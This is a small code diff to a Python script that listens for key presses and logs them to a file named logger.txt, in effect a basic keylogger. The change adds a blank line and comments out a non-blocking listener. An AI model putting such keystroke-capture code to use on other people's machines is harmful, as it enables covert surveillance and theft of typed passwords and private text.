@@ -5,6 +5,7 @@ log_dir = ""
 
 logging.basicConfig(filename=(log_dir + "logger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
+
 def on_press(key):
     try:
         print('alphanumeric key {0} pressed'.format(
@@ -30,7 +31,7 @@ with keyboard.Listener(
     listener.join()
 
 # ...or, in a non-blocking fashion:
-listener = keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release)
-listener.start()
+#listener = keyboard.Listener(
+  #  on_press=on_press,
+   # on_release=on_release)
+#listener.start()
